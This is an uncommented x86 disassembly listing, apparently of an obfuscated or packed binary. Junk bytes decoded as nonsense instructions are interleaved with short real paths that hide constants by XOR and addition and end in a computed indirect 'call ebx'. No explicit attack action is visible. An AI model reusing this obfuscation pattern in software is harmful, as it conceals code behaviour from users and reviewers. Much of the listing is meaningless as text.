  4021dc:	jl     0x40225a
  4021de:	jl     0x402223
  4021e0:	jge    0x402224
  4021e2:	mov    eax,0xeeef60c8
  4021e7:	ins    DWORD PTR es:[edi],dx
  4021e8:	mov    edi,0xb5d77a2e
  4021ed:	jg     0x402170
  4021ef:	xchg   ebp,eax
  4021f0:	xchg   DWORD PTR [edi+0x6dc521d2],esi
  4021f6:	shl    DWORD PTR [esi],cl
  4021f8:	(bad)  
  4021f9:	push   0x46aa600d
  4021fe:	xor    ch,BYTE PTR [ebx+0x78]
  402201:	adc    al,0x6e
  402203:	mov    edx,0x1f9b112c
  402208:	mov    ebx,0xd2308b3b
  40220d:	loopne 0x402231
  40220f:	sub    DWORD PTR [edi+esi*4-0x22],edi
  402213:	icebp  
  402214:	jmp    0x27a1:0x7f905f58
  40221b:	mov    ah,0x7a
  40221d:	sub    BYTE PTR [ebx],0x57
  402220:	adc    DWORD PTR [ecx+edi*8-0x7e4b335],0x19e960f3
  40222b:	call   0x85575bb8
  402230:	pop    esp
  402231:	or     BYTE PTR [ecx],dh
  402233:	xchg   ebp,eax
  402234:	add    ebp,DWORD PTR [ebp-0x3203453e]
  40223a:	(bad)  
  40223b:	fld    DWORD PTR [edi+0xb]
  40223e:	cdq    
  40223f:	jl     0x402294
  402241:	jmp    0xe379b209
  402246:	pop    eax
  402247:	mov    ecx,0x975c5083
  40224c:	mov    ds:0xa59eabb5,eax
  402251:	sub    cl,BYTE PTR [ecx+0x63]
  402254:	inc    esi
  402255:	dec    eax
  402256:	pop    edi
  402257:	popa   
  402258:	arpl   si,di
  40225a:	jp     0x40229b
  40225c:	sub    BYTE PTR [eax+ecx*1+0x63930a21],bl
  402263:	push   ss
  402264:	jp     0x402266
  402266:	jle    0x4022bc
  402268:	dec    ecx
  402269:	mov    edx,0x9aa0b03a
  40226e:	int    0x49
  402270:	or     dl,BYTE PTR [ebx-0x4e]
  402273:	mov    ecx,0xaaab22bd
  402278:	jo     0x402279
  40227a:	and    DWORD PTR [eax+0x101ad3bb],0x4441f579
  402284:	fimul  WORD PTR [edi-0x3b61ccda]
  40228a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40228b:	jmp    0x974ce654
  402290:	adc    dh,BYTE PTR [ebx-0x76d349d6]
  402296:	inc    ebp
  402297:	or     al,0x8b
  402299:	inc    ebp
  40229a:	cld    
  40229b:	mov    ecx,DWORD PTR [ebp-0x8]
  40229e:	jmp    0x402371
  4022a3:	xchg   ebx,eax
  4022a4:	sub    al,BYTE PTR [esp+eax*1]
  4022a7:	cdq    
  4022a8:	cmp    dl,BYTE PTR [ebx+0x426f4fbd]
  4022ae:	mov    dh,0x34
  4022b0:	and    esi,DWORD PTR [ebx]
  4022b2:	mov    al,0xdc
  4022b4:	or     DWORD PTR [esp+edi*2-0x5e],edi
  4022b8:	jl     0x402336
  4022ba:	jl     0x4022c6
  4022bc:	ret    
  4022bd:	push   esi
  4022be:	xchg   esi,eax
  4022bf:	mov    ecx,0x890962a5
  4022c4:	pop    edx
  4022c5:	push   cs
  4022c6:	push   es
  4022c7:	ret    0x6cb2
  4022ca:	cli    
  4022cb:	fsub   DWORD PTR [esi-0x72]
  4022ce:	out    0x81,al
  4022d0:	fiadd  WORD PTR [eax*1-0x19b2f3e5]
  4022d7:	idiv   DWORD PTR [ebp-0x2f0e42f0]
  4022dd:	daa    
  4022de:	retf   0xcdb9
  4022e1:	xlat   BYTE PTR ds:[ebx]
  4022e2:	xor    esp,DWORD PTR ds:0xcb811cae
  4022e8:	sbb    al,0x50
  4022ea:	popf   
  4022eb:	fidiv  DWORD PTR [ecx]
  4022ed:	arpl   WORD PTR [ebp-0x3b9e7a1d],bx
  4022f3:	add    eax,0x5b8b17f0
  4022f8:	xchg   DWORD PTR [eax-0x60],ecx
  4022fb:	cwde   
  4022fc:	(bad)  
  4022fe:	add    dl,ah
  402300:	sub    al,0x69
  402302:	jmp    0xe5b2:0xf3e6214a
  402309:	cli    
  40230a:	push   edi
  40230b:	and    BYTE PTR [eax-0x49],dl
  40230e:	ins    DWORD PTR es:[edi],dx
  40230f:	lock dec esi
  402311:	xor    bl,BYTE PTR [ebp+eax*2+0x60c8d248]
  402318:	or     eax,0xb7745bd
  40231d:	mov    ds:0xc5f83cd4,eax
  402322:	(bad)  
  402323:	jo     0x402337
  402325:	pop    ecx
  402326:	dec    ebp
  402327:	pop    esp
  402328:	aas    
  402329:	inc    esp
  40232a:	cs mov ah,0xd3
  40232d:	clc    
  40232e:	cmp    al,0x4c
  402330:	jp     0x4023a9
  402332:	fdivr  DWORD PTR [esi+0x76]
  402335:	mov    DWORD PTR [edi-0x5f],esp
  402338:	xchg   ebx,eax
  402339:	adc    DWORD PTR [edi-0x2fbd6e2],edx
  40233f:	cld    
  402340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402341:	push   0xff95d832
  402346:	outs   dx,DWORD PTR ds:[esi]
  402347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402348:	add    eax,0x334d63a5
  40234d:	lea    edx,[ebx+0x25]
  402350:	sbb    esi,DWORD PTR ds:0x25f6c03c
  402356:	or     DWORD PTR [edi-0x120670aa],edi
  40235c:	mov    esp,0x94a1f737
  402361:	jle    0x4023c0
  402363:	sbb    al,0xd0
  402365:	cs dec ebx
  402367:	stos   DWORD PTR es:[di],eax
  402369:	or     esp,DWORD PTR [edi-0x3c46efe1]
  40236f:	das    
  402370:	add    DWORD PTR ds:0x7510857,esi
  402376:	add    eax,ebx
  402378:	cmp    ecx,eax
  40237a:	jne    0x40238d
  402380:	mov    eax,DWORD PTR [ebp-0x4]
  402383:	xor    eax,0x7510857
  402388:	jmp    0x4021ae
  40238d:	mov    eax,DWORD PTR [ebp+0xc]
  402390:	add    eax,DWORD PTR [ebp+0x8]
  402393:	mov    DWORD PTR [ebp-0x10],eax
  402396:	mov    eax,DWORD PTR [ebp-0x1c]
  402399:	test   eax,eax
  40239b:	je     0x4026e4
  4023a1:	mov    DWORD PTR [ebp-0x24],esi
  4023a4:	push   0xb
  4023a6:	pop    ecx
  4023a7:	push   0x5
  4023a9:	dec    ecx
  4023aa:	pop    ebx
  4023ab:	xchg   ebx,ecx
  4023ad:	sub    ebx,ecx
  4023af:	xchg   ebx,ecx
  4023b1:	dec    ecx
  4023b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4023b5:	imul   eax,ecx
  4023b8:	sub    esp,eax
  4023ba:	mov    DWORD PTR [ebp-0x24],esp
  4023bd:	mov    eax,DWORD PTR [ebp-0x4]
  4023c0:	mov    ecx,0x7510857
  4023c5:	xor    eax,ecx
  4023c7:	mov    edx,0x32729e
  4023cc:	add    eax,edx
  4023ce:	mov    DWORD PTR [ebp+0x8],eax
  4023d1:	jmp    0x4024a4
  4023d6:	cmp    dl,BYTE PTR [esi+0x7b653be5]
  4023dc:	cli    
  4023dd:	test   eax,0x3babd173
  4023e2:	add    al,0x4c
  4023e4:	mov    esp,DWORD PTR ds:0x7c7c0802
  4023ea:	mov    ds:0xe57c7c7c,al
  4023ef:	fwait
  4023f0:	xchg   ecx,edi
  4023f2:	sbb    al,cl
  4023f4:	dec    eax
  4023f5:	mov    eax,DWORD PTR [ecx]
  4023f7:	hlt    
  4023f8:	popf   
  4023f9:	loope  0x402479
  4023fb:	dec    ecx
  4023fc:	retf   0xaa78
  4023ff:	jbe    0x4023e9
  402401:	aas    
  402402:	jo     0x4023da
  402404:	add    edi,DWORD PTR [edi]
  402406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402407:	ja     0x402471
  402409:	fstp   TBYTE PTR [esi]
  40240b:	mov    ds:0x5b64535f,al
  402410:	jge    0x40247f
  402412:	(bad)  [edi]
  402414:	mov    WORD PTR [ecx+edi*8],cs
  402417:	in     al,0x7e
  402419:	pop    ebp
  40241a:	mov    al,ds:0x5502498b
  40241f:	sti    
  402420:	push   esi
  402421:	push   ecx
  402422:	sub    BYTE PTR [ecx-0x73],cl
  402425:	pop    ds
  402426:	push   es
  402427:	mov    edx,0x87d01ac1
  40242c:	sub    eax,0xa6518e1
  402431:	cmp    ecx,DWORD PTR [ebp+0x4f]
  402434:	aam    0xcd
  402436:	mov    dl,0x8a
  402438:	push   edi
  402439:	push   ss
  40243a:	popf   
  40243b:	cld    
  40243c:	cmp    esp,DWORD PTR [eax+eiz*1+0x4e041c71]
  402443:	jne    0x402436
  402445:	adc    edi,DWORD PTR ds:0xb479c096
  40244b:	and    eax,0xffffffa0
  40244e:	mov    edx,0xd7ea26a0
  402453:	add    edi,DWORD PTR ds:0x3d2c80a8
  402459:	adc    al,0xe3
  40245b:	out    dx,eax
  40245c:	fiadd  DWORD PTR ss:0x4e92a7c3
  402463:	fdiv   QWORD PTR [ebx]
  402465:	push   es
  402466:	arpl   sp,bx
  402468:	repz pushf 
  40246a:	xchg   edx,eax
  40246b:	xchg   ebp,eax
  40246c:	jbe    0x40243d
  40246e:	adc    dh,BYTE PTR [ebx]
  402470:	in     eax,0xc3
  402472:	dec    edi
  402473:	sar    ecx,cl
  402475:	sahf   
  402476:	pop    esp
  402477:	pop    ebp
  402478:	cli    
  402479:	enter  0x35af,0x7
  40247d:	cdq    
  40247e:	jnp    0x40247e
  402480:	xchg   edx,eax
  402481:	loopne 0x402488
  402483:	retf   0xa7fc
  402486:	ret    
  402487:	jmp    0x4024e1
  402489:	inc    edi
  40248a:	and    ebx,DWORD PTR [ebp+0x3]
  40248d:	pop    edx
  40248e:	(bad)  [ecx+ebx*2]
  402491:	ja     0x4024d6
  402493:	or     al,0x53
  402495:	aam    0xff
  402497:	xor    eax,0x4f535bd3
  40249c:	test   eax,0x769ef7be
  4024a1:	add    DWORD PTR [edx-0x17ba74a2],ebp
  4024a7:	xor    eax,ecx
  4024a9:	add    eax,edx
  4024ab:	mov    edx,DWORD PTR [ebp+0x14]
  4024ae:	jmp    0x402581
  4024b3:	and    al,0x81
  4024b5:	rep ins BYTE PTR es:[edi],dx
  4024b7:	lods   eax,DWORD PTR ds:[esi]
  4024b8:	(bad)  
  4024b9:	sti    
  4024ba:	pop    ecx
  4024bb:	xor    DWORD PTR [ebx],0xf3adbfae
  4024c1:	lock out dx,eax
  4024c3:	dec    eax
  4024c4:	or     BYTE PTR [esp+edi*2-0x5e],bh
  4024c8:	jl     0x402546
  4024ca:	jl     0x402495
  4024cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024cd:	dec    eax
  4024ce:	dec    eax
  4024cf:	xchg   ebp,eax
  4024d0:	mov    DWORD PTR [eax],eax
  4024d2:	nop
  4024d3:	addr16 adc al,0xdb
  4024d6:	inc    ebp
  4024d7:	(bad)  
  4024d8:	and    eax,0x65a26dce
  4024dd:	push   ebx
  4024de:	xchg   DWORD PTR [edi+0x23],eax
  4024e1:	into   
  4024e2:	add    al,0xb9
  4024e4:	xchg   esi,eax
  4024e5:	push   esi
  4024e6:	xor    eax,0x3180edf6
  4024eb:	inc    ecx
  4024ec:	stos   BYTE PTR es:[edi],al
  4024ed:	lods   eax,DWORD PTR ds:[esi]
  4024ee:	aam    0xc2
  4024f0:	sub    edx,ecx
  4024f2:	dec    edi
  4024f3:	mov    eax,ds:0x9b99b39b
  4024f8:	xchg   ecx,eax
  4024f9:	fcomp  DWORD PTR [ebx+0x4803fbeb]
  4024ff:	mov    WORD PTR [edx+0x6c],gs
  402502:	mov    eax,0xb826df2d
  402507:	mov    ah,bh
  402509:	jmp    0x40249b
  40250b:	fs jmp 0x9dca:0x5c435f5d
  402513:	into   
  402514:	add    BYTE PTR [ecx],bh
  402516:	xchg   ecx,eax
  402517:	(bad)  [ecx-0x4176b30b]
  40251d:	dec    esi
  40251e:	sub    BYTE PTR [edx],dh
  402520:	shl    ebx,0x36
  402523:	icebp  
  402524:	add    al,0x24
  402526:	pop    ebp
  402527:	mov    ?,WORD PTR [ecx]
  402529:	mov    WORD PTR ss:[edx+eiz*1+0xc],fs
  40252e:	cmp    al,0x46
  402530:	dec    ebp
  402531:	and    eax,0x8e67c311
  402536:	sar    DWORD PTR [ebx+0x1d],cl
  402539:	(bad)  
  40253a:	(bad)  
  40253c:	adc    eax,esi
  40253e:	dec    esp
  40253f:	dec    eax
  402540:	imul   edi,DWORD PTR [ecx],0xffffffab
  402543:	cmp    al,0xf7
  402545:	mov    ds:0xf91c6359,al
  40254a:	inc    ecx
  40254b:	xchg   ch,al
  40254d:	lods   al,BYTE PTR ds:[esi]
  40254e:	mov    ecx,0x68474cb5
  402553:	jle    0x402501
  402555:	or     BYTE PTR [edi],ah
  402557:	es das 
  402559:	jecxz  0x402541
  40255b:	dec    edi
  40255c:	xor    eax,0xd18b79dc
  402561:	mov    bl,0x8d
  402563:	cmp    al,0xc3
  402565:	lods   eax,DWORD PTR ds:[esi]
  402566:	xchg   DWORD PTR [ecx+ecx*8-0x48],esi
  40256a:	outs   dx,DWORD PTR ds:[esi]
  40256b:	xchg   edx,eax
  40256c:	pop    edi
  40256d:	icebp  
  40256e:	fistp  WORD PTR [esi-0x2451efcb]
  402574:	sar    DWORD PTR [edi+0x5a],1
  402577:	fstp   TBYTE PTR [edx]
  402579:	push   es
  40257a:	pop    esi
  40257b:	div    esp
  40257d:	sbb    eax,0xf30eaab
  402582:	scas   eax,DWORD PTR es:[edi]
  402583:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  402589:	mov    ecx,DWORD PTR [ebp+0x8]
  40258c:	lea    ecx,[edx+ecx*1+0x32729e]
  402593:	cmp    ecx,eax
  402595:	je     0x4026df
  40259b:	mov    edi,DWORD PTR [ebp-0x18]
  40259e:	mov    eax,DWORD PTR [ebp+0x8]
  4025a1:	mov    edx,DWORD PTR [ebp+0x14]
  4025a4:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4025a8:	mov    ecx,0x7510857
  4025ad:	xor    edx,edx
  4025af:	xor    edi,ecx
  4025b1:	mov    esi,0x32729e
  4025b6:	add    edi,esi
  4025b8:	div    edi
  4025ba:	mov    edx,DWORD PTR [ebp-0x4]
  4025bd:	xor    edx,ecx
  4025bf:	lea    eax,[edx+eax*1+0x32729e]
  4025c6:	mov    edx,DWORD PTR [ebp+0x8]
  4025c9:	mov    edi,DWORD PTR [ebp-0x24]
  4025cc:	mov    DWORD PTR [edi+edx*4],eax
  4025cf:	mov    eax,DWORD PTR [ebp-0x18]
  4025d2:	mov    edx,DWORD PTR [ebp+0x8]
  4025d5:	xor    eax,ecx
  4025d7:	lea    eax,[eax+edx*1+0x32729e]
  4025de:	mov    DWORD PTR [ebp+0x8],eax
  4025e1:	mov    eax,DWORD PTR [ebp-0x18]
  4025e4:	mov    edx,DWORD PTR [ebp+0x14]
  4025e7:	xor    eax,ecx
  4025e9:	add    eax,esi
  4025eb:	imul   eax,DWORD PTR [edx]
  4025ee:	mov    edx,DWORD PTR [ebp-0x4]
  4025f1:	xor    edx,ecx
  4025f3:	mov    ecx,DWORD PTR [ebp+0x8]
  4025f6:	lea    ecx,[edx+ecx*1+0x32729e]
  4025fd:	cmp    ecx,eax
  4025ff:	jne    0x40259b
  402605:	jmp    0x4026d8
  40260a:	xlat   BYTE PTR ds:[ebx]
  40260b:	pop    esp
  40260c:	cmp    DWORD PTR [eax-0x47],eax
  40260f:	pop    ebp
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	jnp    0x4025e8
  402613:	sbb    ch,bl
  402615:	mov    DWORD PTR [ebx-0x1d86b72],esi
  40261b:	or     edi,DWORD PTR [esp+edi*2-0x5e]
  40261f:	jl     0x40269d
  402621:	jl     0x402610
  402623:	pop    esp
  402624:	add    BYTE PTR [ebx-0x2b],dh
  402627:	xchg   ebp,eax
  402628:	dec    esp
  402629:	mov    ebx,0xda6cbe02
  40262e:	fwait
  40262f:	outs   dx,BYTE PTR ds:[esi]
  402630:	daa    
  402631:	xchg   ebp,eax
  402632:	mul    edx
  402634:	sbb    eax,0x6440521a
  402639:	and    edx,DWORD PTR [edi]
  40263b:	sub    BYTE PTR [ebx-0x463bd374],0x32
  402642:	imul   ecx,DWORD PTR [eax+eiz*2-0x69],0x3866ce06
  40264a:	pusha  
  40264b:	push   ecx
  40264d:	out    dx,al
  40264e:	into   
  40264f:	call   0x24ee63ce
  402654:	lock mov dl,0xf3
  402657:	jno    0x4026a0
  402659:	or     cl,BYTE PTR [eax+ebx*2+0xe]
  40265d:	aas    
  40265e:	mov    ah,BYTE PTR [edx]
  402660:	inc    esi
  402661:	mov    eax,ds:0x22416302
  402666:	enter  0x8421,0xa0
  40266a:	dec    edx
  40266b:	arpl   WORD PTR [ebx-0x4],dx
  40266e:	mov    bl,0x2d
  402670:	xchg   ebx,eax
  402671:	adc    al,0x84
  402673:	mov    esp,0x3d1a55aa
  402678:	scas   al,BYTE PTR es:[edi]
  402679:	repz mov ah,0x28
  40267c:	fidivr WORD PTR [edx+0x252d4d59]
  402682:	push   esp
  402683:	lds    eax,FWORD PTR [ecx+edx*8+0x66668aed]
  40268a:	add    ch,BYTE PTR [ecx]
  40268c:	pusha  
  40268d:	jnp    0x4026da
  40268f:	pop    esi
  402690:	in     eax,dx
  402691:	fadd   DWORD PTR [esi]
  402693:	fsubr  QWORD PTR [ebp+0x619977d]
  402699:	sub    al,0x9b
  40269b:	daa    
  40269c:	dec    ecx
  40269d:	(bad)  
  40269e:	in     al,0x2b
  4026a0:	hlt    
  4026a1:	lock mov esp,0x557cd7f4
  4026a7:	push   esp
  4026a8:	outs   dx,DWORD PTR ds:[esi]
  4026a9:	outs   dx,DWORD PTR gs:[esi]
  4026ab:	pop    esi
  4026ac:	sub    DWORD PTR gs:[eax-0x4514c326],ebp
  4026b3:	push   ecx
  4026b4:	and    al,0x89
  4026b6:	fbstp  TBYTE PTR [edx]
  4026b8:	mov    dh,0x89
  4026ba:	jne    0x4026f7
  4026bc:	mov    ?,WORD PTR [ebp-0x26]
  4026bf:	mov    WORD PTR [eax+0x4a92eecc],ss
  4026c5:	addr16 pop edx
  4026c7:	out    0xa8,al
  4026c9:	jne    0x4026aa
  4026cb:	pushf  
  4026cc:	div    BYTE PTR [ebp-0x6f]
  4026cf:	ret    0xa649
  4026d2:	fild   DWORD PTR [esi-0x77833aa]
  4026d8:	mov    ebx,esi
  4026da:	jmp    0x4026e4
  4026df:	mov    ebx,0x32729e
  4026e4:	mov    eax,DWORD PTR [ebp-0x4]
  4026e7:	xor    eax,0x7510857
  4026ec:	jmp    0x4027bf
  4026f1:	(bad)  
  4026f2:	fsubr  st(2),st
  4026f4:	mov    esp,0x647a42fa
  4026f9:	clc    
  4026fa:	(bad)  
  4026fb:	mov    WORD PTR [ecx-0x66],?
  4026fe:	jle    0x402730
  402700:	xlat   BYTE PTR ds:[ebx]
  402701:	and    al,0xa
  402703:	jl     0x402781
  402705:	mov    ds:0xc7c7c7c,al
  40270a:	jmp    0xb3e7:0x7c931828
  402711:	mov    DWORD PTR [edx-0x3c],esi
  402714:	dec    ebp
  402715:	mov    edx,0x551d8465
  40271a:	popa   
  40271b:	push   0xffffffc8
  40271d:	jecxz  0x402752
  40271f:	arpl   WORD PTR [esi],dx
  402721:	jmp    0x4026ee
  402723:	add    BYTE PTR [ebp+0x268d9013],0x7a
  40272a:	mov    bh,0xef
  40272c:	push   0x1e9e6008
  402731:	inc    ebp
  402732:	sbb    DWORD PTR [edx+edx*2+0xa042834],ebp
  402739:	inc    edi
  40273a:	xor    bl,BYTE PTR [edx+0x3c3330df]
  402740:	sbb    ah,BYTE PTR [eax-0x26]
  402743:	cmp    bh,BYTE PTR [eax+edx*2]
  402746:	pop    ss
  402747:	xor    esi,DWORD PTR [esi+esi*2-0x12]
  40274b:	push   ebx
  40274c:	sbb    al,0x1e
  40274e:	dec    ebx
  40274f:	cli    
  402750:	in     eax,dx
  402751:	jg     0x40278c
  402753:	aas    
  402754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402755:	test   al,0xab
  402757:	xor    eax,DWORD PTR [eax]
  402759:	mov    bl,BYTE PTR [edx+0x48]
  40275c:	psubsb mm1,QWORD PTR [ebp-0x1844831f]
  402763:	(bad)  
  402764:	dec    ebp
  402765:	popf   
  402766:	sub    BYTE PTR [edx],al
  402768:	out    dx,al
  402769:	add    al,0x17
  40276b:	adc    edx,DWORD PTR [eax+0x5f]
  40276e:	or     ecx,esi
  402770:	data16 (bad) 
  402772:	mov    ecx,0x6a764b1d
  402777:	retf   0x5a30
  40277a:	sub    cl,0x52
  40277d:	push   ebp
  40277e:	test   dh,cl
  402780:	scas   eax,DWORD PTR es:[edi]
  402781:	push   cs
  402782:	push   0xffffffa1
  402784:	push   cs
  402785:	int    0x68
  402787:	fdivp  st(5),st
  402789:	jmp    0x710b:0x3b45a1fe
  402790:	or     edi,edi
  402792:	test   BYTE PTR [ecx+0x31],0x64
  402796:	je     0x402760
  402798:	mov    DWORD PTR [ebx+ecx*8],eax
  40279b:	std    
  40279c:	pop    edx
  40279d:	jp     0x40279c
  40279f:	gs or  al,0xfd
  4027a2:	dec    edx
  4027a3:	or     DWORD PTR [ecx+0x6b5494a3],ebx
  4027a9:	pop    ss
  4027aa:	loopne 0x40273b
  4027ac:	cmp    al,0x69
  4027ae:	cmp    al,0xff
  4027b0:	dec    eax
  4027b1:	aaa    
  4027b2:	icebp  
  4027b3:	xor    eax,0xdee17db6
  4027b8:	push   ebp
  4027b9:	ds aaa 
  4027bb:	xor    dh,BYTE PTR [ebx]
  4027bd:	mov    dh,0xc4
  4027bf:	add    eax,ebx
  4027c1:	mov    DWORD PTR [ebp-0xc],eax
  4027c4:	jmp    0x402897
  4027c9:	pop    ebp
  4027ca:	fimul  WORD PTR [ebp+eiz*8+0x567d65bb]
  4027d1:	cdq    
  4027d2:	push   es
  4027d3:	mov    si,0xf1d4
  4027d7:	sbb    al,0x1f
  4027d9:	push   0xa
  4027db:	jl     0x402859
  4027dd:	mov    ds:0x687c7c7c,al
  4027e2:	push   ds
  4027e3:	adc    BYTE PTR [ebp-0x6aa5b79a],dh
  4027e9:	pop    edx
  4027ea:	lods   eax,DWORD PTR ds:[esi]
  4027eb:	arpl   WORD PTR [edx-0x7985df1b],dx
  4027f1:	shl    BYTE PTR [eax+0x13],1
  4027f4:	sub    al,0x92
  4027f6:	ds enter 0xab25,0x80
  4027fb:	fwait
  4027fc:	inc    eax
  4027fd:	or     eax,0xc0c6b14c
  402802:	icebp  
  402803:	xor    al,al
  402805:	mov    esp,gs
  402807:	(bad)  
  402808:	jle    0x40280c
  40280a:	inc    bx
  40280c:	cdq    
  40280d:	mov    bl,BYTE PTR [edi-0x74]
  402810:	inc    eax
  402811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402812:	popa   
  402813:	test   eax,0xbed3b71b
  402818:	lods   al,BYTE PTR ds:[esi]
  402819:	test   eax,0x6f5e55d2
  40281e:	mov    BYTE PTR [ebx+0x1f97cfb8],bh
  402824:	les    ecx,FWORD PTR [edi]
  402826:	pop    edi
  402827:	nop
  402828:	jns    0x402813
  40282a:	in     al,0x61
  40282c:	xchg   edi,eax
  40282d:	xchg   esi,eax
  40282e:	loope  0x4027ba
  402830:	mov    eax,0x3b4c39da
  402835:	dec    esp
  402836:	pop    ds
  402837:	inc    esp
  402838:	xchg   DWORD PTR [edi+eiz*2+0x43342f36],edx
  40283f:	mov    bl,0x82
  402841:	outs   dx,BYTE PTR ds:[esi]
  402842:	dec    esi
  402843:	cmp    eax,0xa5c03ed2
  402848:	gs dec esp
  40284a:	cmp    BYTE PTR [ebx+eax*4],dl
  40284d:	sbb    al,cl
  40284f:	jo     0x402810
  402851:	loopne 0x402862
  402853:	sti    
  402854:	dec    eax
  402855:	outs   dx,BYTE PTR ds:[esi]
  402856:	inc    eax
  402857:	inc    ecx
  402858:	adc    eax,0xaa07e410
  40285d:	mov    WORD PTR [edi],ds
  40285f:	xor    al,0x17
  402861:	cmp    BYTE PTR [edi],dh
  402863:	adc    bh,0xca
  402866:	cdq    
  402867:	sahf   
  402868:	pop    ebp
  402869:	dec    ebx
  40286a:	outs   dx,DWORD PTR ds:[esi]
  40286b:	ss (bad) 
  40286d:	daa    
  40286e:	(bad)  
  40286f:	stc    
  402870:	test   ecx,eax
  402872:	jl     0x402835
  402874:	scas   eax,DWORD PTR es:[edi]
  402875:	xchg   ecx,eax
  402876:	add    ebx,DWORD PTR [esi]
  402878:	inc    edi
  402879:	push   ds
  40287a:	inc    eax
  40287b:	xor    edx,eax
  40287d:	dec    ebx
  40287e:	cdq    
  40287f:	loop   0x40281c
  402881:	repz inc ecx
  402883:	and    eax,0x899cbf69
  402888:	or     ecx,DWORD PTR [esi+0x2c]
  40288b:	sbb    al,0x7a
  40288d:	push   cs
  40288e:	std    
  40288f:	cmp    eax,0x5998e31f
  402894:	ds out 0xe9,eax
  402897:	xor    ebx,ebx
  402899:	lea    eax,[ebp-0x10]
  40289c:	add    ebx,DWORD PTR [eax]
  40289e:	call   ebx
  4028a0:	xor    ebx,ebx
  4028a2:	inc    ebx
  4028a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4028a6:	jmp    0x402979
  4028ab:	jmp    0x4028ef
  4028ad:	inc    esp
  4028ae:	ins    BYTE PTR es:[edi],dx
  4028af:	jns    0x40292b
  4028b1:	jmp    0x402910
  4028b3:	loope  0x40292e
  4028b5:	pushf  
  4028b6:	sbb    BYTE PTR [ebx-0x2d],0x9
  4028ba:	das    
  4028bb:	nop
  4028bc:	or     eax,0x7ca27c7c
  4028c1:	jl     0x40293f
  4028c3:	jmp    0xae0feccf
  4028c8:	cld    
  4028c9:	rol    BYTE PTR fs:[ebx-0xb9de8ee],1
  4028d0:	gs bound edi,QWORD PTR es:[eax-0x7d]
  4028d5:	mov    WORD PTR [ecx+0x56bf33fc],gs
  4028db:	rcr    DWORD PTR [edi],0x90
  4028de:	fs icebp 
  4028e0:	xchg   esp,eax
  4028e1:	cs lahf 
  4028e3:	jae    0x402868
  4028e5:	repz sub ebp,ecx
  4028e8:	mov    dh,0x29
  4028ea:	sbb    dl,ah
  4028ec:	fcomi  st,st(3)
  4028ee:	xor    edx,DWORD PTR [ecx+0x451f130]
  4028f4:	cdq    
  4028f5:	or     DWORD PTR [eax+ebp*2-0x31],edi
  4028f9:	fcomp  QWORD PTR [edx]
  4028fb:	jo     0x4028db
  4028fd:	stc    
  4028fe:	and    ebx,DWORD PTR [ecx+0x57]
  402901:	(bad)  
  402902:	cli    
  402903:	mov    ecx,0x75578a8b
  402908:	in     eax,0xca
  40290a:	push   esi
  40290b:	out    0x3a,eax
  40290d:	xchg   esp,eax
  40290e:	repnz xchg esi,eax
  402910:	into   
  402911:	xchg   ecx,eax
  402912:	mov    esp,0x64290044
  402917:	loop   0x4028f6
  402919:	pop    edi
  40291a:	hlt    
  40291b:	pop    es
  40291c:	jbe    0x402977
  40291e:	jbe    0x4028c6
  402920:	fst    DWORD PTR [ebx+0x2a]
  402923:	cs test dh,ah
  402926:	rcl    esi,1
  402928:	xchg   BYTE PTR [esi],dl
  40292a:	enter  0xc48e,0xcc
  40292e:	nop
  40292f:	fstp   TBYTE PTR [ebx+ecx*2+0x4b34c5c7]
  402936:	jecxz  0x40290e
  402938:	and    BYTE PTR [ebx],dh
  40293a:	push   esi
  40293b:	retf   0x5ccb
  40293e:	minps  xmm0,XMMWORD PTR ds:0x72689267
  402945:	fisttp DWORD PTR [ebx+0x0]
  402948:	fld    TBYTE PTR [esi]
  40294a:	or     al,0xff
  40294c:	arpl   bx,ax
  40294e:	mov    ch,BYTE PTR [eax]
  402950:	mov    ebp,0xdcd5671c
  402955:	popf   
  402956:	mov    bh,0xcd
  402958:	xchg   ch,dh
  40295a:	shl    BYTE PTR [esi+0x33],1
  40295d:	dec    edx
  40295e:	leave  
  40295f:	call   0x7410:0x5bd751f3
  402966:	jg     0x82cc07b8
  40296c:	push   edx
  40296d:	inc    esi
  40296e:	test   ch,bh
  402970:	out    dx,al
  402971:	test   DWORD PTR [esi],ecx
  402973:	or     ebp,eax
  402975:	push   ecx
  402976:	int    0xf4
  402978:	or     BYTE PTR [edi],cl
  40297a:	test   BYTE PTR [eax],bl
  40297c:	add    BYTE PTR [eax],al
  40297e:	add    BYTE PTR [edx+0x6a590a6a],dl
  402984:	add    al,0x5b
  402986:	inc    ebx
  402987:	xchg   ebx,ecx
  402989:	sub    ebx,ecx
  40298b:	xchg   ebx,ecx
  40298d:	dec    ecx
  40298e:	mov    eax,DWORD PTR [ebp-0x1c]
  402991:	imul   eax,ecx
  402994:	add    esp,eax
  402996:	xchg   edx,eax
  402997:	push   eax
  402998:	xor    ebx,ebx
  40299a:	mov    edx,esp
  40299c:	jmp    0x402a6f
  4029a1:	jns    0x4029c0
  4029a3:	inc    ebp
  4029a4:	ds gs mov dh,0x7d
  4029a8:	mov    ebp,0x6beb4b4b
  4029ad:	lods   eax,DWORD PTR ds:[esi]
  4029ae:	rcl    DWORD PTR [ebp+0x7c0cc6de],cl
  4029b4:	jl     0x402958
  4029b6:	jl     0x402a34
  4029b8:	jl     0x4029f1
  4029ba:	imul   esi,DWORD PTR [edx-0x591384eb],0x1b
  4029c1:	dec    edx
  4029c2:	mov    cl,0xab
  4029c4:	pop    edi
  4029c5:	int    0xb1
  4029c7:	push   edx
  4029c8:	jne    0x40299b
  4029ca:	shr    DWORD PTR [edi+0x240b8cfb],cl
  4029d0:	ja     0x4029e9
  4029d2:	sbb    cl,BYTE PTR gs:[esi+0x7525256]
  4029d9:	js     0x4029d0
  4029db:	mov    cl,BYTE PTR [edx+ecx*8]
  4029de:	aam    0x35
  4029e0:	pop    esp
  4029e1:	fcmovnb st,st(6)
  4029e3:	xor    esi,edi
  4029e5:	jle    0x4029a0
